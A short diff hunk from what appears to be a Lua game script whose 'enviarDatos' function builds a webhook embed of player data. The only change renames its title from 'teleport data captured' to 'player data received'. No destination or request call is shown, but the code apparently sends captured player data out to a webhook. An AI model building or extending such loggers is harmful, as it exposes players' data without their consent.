@@ -43,7 +43,7 @@ local function enviarDatos()
     if request and player and success then
         local EmbedData = {
             ["embeds"] = {{
-                ["title"] = "🛰️ Datos de Teleport capturados",
+                ["title"] = "🛰️ Datos de Jugador Recibidos",
                 ["color"] = 0x00ff00, -- Verde
                 ["thumbnail"] = { ["url"] = avatarUrl },
                 ["fields"] = {
